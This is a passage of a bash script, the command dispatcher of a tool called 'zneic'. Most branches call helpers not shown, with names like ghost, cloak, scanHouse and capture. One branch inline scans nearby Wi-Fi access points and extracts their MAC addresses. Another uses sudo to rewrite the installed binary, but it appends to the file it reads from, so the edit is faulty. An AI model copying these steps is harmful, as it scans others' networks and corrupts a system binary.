elif [[ "$(echo $1 | grep -c 'update')" == "1" ]]; then

  _update $2

elif [[ "$(echo $1 | grep -c 'repair')" == "1" ]]; then

  _repair $2

elif [[ "$(echo $1 | grep -c 'brew')" == "1" ]]; then

  _brew $2 $3

elif [[ "$(echo $1 | grep -c 'off')" == "1" ]]; then

  _off

elif [[ "$(echo $1 | grep -c 'dsn')" == "1" || "$(echo $1 | grep -c 'design')" == "1" ]]; then

  _design $2 $3 $4 $5

elif [[ "$(echo $1 | grep -c 'summon')" == "1" ]]; then

  _summon $2

elif [[ "$(echo $1 | grep -c 'origin')" == "1" ]]; then

  _origin $2


elif [[ "$(echo $1 | grep -c 'self')" == "1" ]]; then

  _self $2 $3 $4

elif [[ "$(echo $1 | grep -c 'relist')" == "1" ]]; then

  _relist

elif [[ "$(echo $1 | grep -c 'highlight')" == "1" ]]; then

  _highlight

elif [[ "$(echo $1 | grep -c 'reveal')" == "1" ]]; then

  _reveal

elif [[ "$(echo $1 | grep -c '++')" == "1" ]]; then

  _incr

elif [[ "$(echo $1 | grep -c 'appID')" == "1" ]]; then

  _appID

elif [[ "$(echo $1 | grep -c 'melt')" == "1" ]]; then

  _melt

elif [[ "$1" == "to" || "$1" == "or" || "$1" == "must" || "$1" == "dead" ]]; then

  _c_melt $2

elif [[ "$1" == "is" || "$1" == "should" ]]; then

  _r_w $2

elif [[ "$(echo $1 | grep -c 'shed')" == "1" ]]; then

  _melt

elif [[ "$(echo $1 | grep -c 'ex')" == "1" ]]; then

  _expand

elif [[ "$(echo $1 | grep -c 'rep')" == "1" ]]; then

  _replicate

elif [[ "$(echo $1 | grep -c 'salt')" == "1" ]]; then

  _salt $2 $3

elif [[ "$(echo $1 | grep -c 'net')" == "1" ]]; then

  _network $2

elif [[ "$(echo $1 | grep -c 'allwifi')" == "1" ]]; then

  airport -s | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'

  airport -s | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' |  xargs -L1 zneic -soui

elif [[ "$(echo $1 | grep -c 'seewifi')" == "1" ]]; then

  airport -s


elif [[ "$(echo $1 | grep -c 'router')" == "1" ]]; then

  _router_info

elif [[ "$(echo $1 | grep -c 'people')" == "1" ]]; then

  _people

elif [[ "$(echo $1 | grep -c 'devices')" == "1" ]]; then

  _people

elif [[ "$(echo $1 | grep -c 'everything')" == "1" ]]; then

  _everything

elif [[ "$(echo $1 | grep -c 'myself')" == "1" ]]; then

  _myself

elif [[ "$1" == "-hide" ]]; then

  _hide

elif [[ "$1" == "-badblood" ]]; then

  _badblood

elif [[ "$1" == "-mac" ]]; then

  _macA

elif [[ "$1" == "-soui" ]]; then

  _jvdr $2

elif [[ "$1" == "-cloak" ]]; then

  _cloak $2 $3 $4

elif [[ "$1" == "-scan" ]]; then

  _scanHouse $2

elif [[ "$1" == "-ghost" ]]; then

  _ghost

elif [[ "$(echo $1 | grep -c 'unghost')" == "1" || "$(echo $1 | grep -c 'revive')" == "1" ]]; then

  _revive

elif [[ "$1" == "-test" ]]; then

  _newScan


elif [[ "$1" == "-blink" ]]; then

  printf "$_blinking\n"

elif [[ "$1" == "-unblink" ]]; then
  #cat /usr/local/bin/zneic | sed 's/_blinking=true/_blinking=false/g' > /.thezneic ; zneic -uninstall ; sudo mv .thezneic /usr/local/bin/zneic ; cd /usr/local/bin/ ; sh zneic -qinstall ; cd ~
  printf "$_blinking\n"

  _converted=$( echo zneic | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')

      cd ~ ; mkdir .blanao ; cd .blanao
      sudo cp /usr/local/bin/zneic ./zneic
      cat zneic | sed "s/_blinking=true/_blinking=false/g" >> zneic
      sudo chmod +x zneic ; sudo cp zneic /usr/local/bin/ ; cd .. ; sudo rm -rf .blanao

elif  [[ "$1" == "-check" ]]; then
  printf "$_blinking\n"

elif [[ "$(echo $1 | grep -c 'blood')" == "1" ]]; then

  _blood

elif [[ "$1" == "-uname" ]]; then

  _uname

elif [[ "$1" == "-os" ]]; then

  _ros $2 $3

elif [[ "$(echo $1 | grep -c 'protect')" == "1" ]]; then

  _protect $1

elif [[ "$(echo $1 | grep -c 'back')" == "1" ]]; then

  _back

elif [[ "$(echo $1 | grep -c 'change')" == "1" ]]; then

  _w_melt $2 $3

elif [[ "$(echo $1 | grep -c 'pd')" == "1" ]]; then

  _pd

elif [[ "$(echo $1 | grep -c 'uengage')" == "1" ]]; then

  _u_engage

elif [[ "$(echo $1 | grep -c 'udngage')" == "1" ]]; then

  _u_disengage

elif [[ "$1" == "_+" ]]; then

  _openWith $2 $3

elif [[ "$(echo $1 | grep -c 'light')" == "1" ]]; then
  _light

elif [[ "$(echo $1 | grep -c 'capture')" == "1" ]]; then

  _capture $2 $3

else

  htop

fi
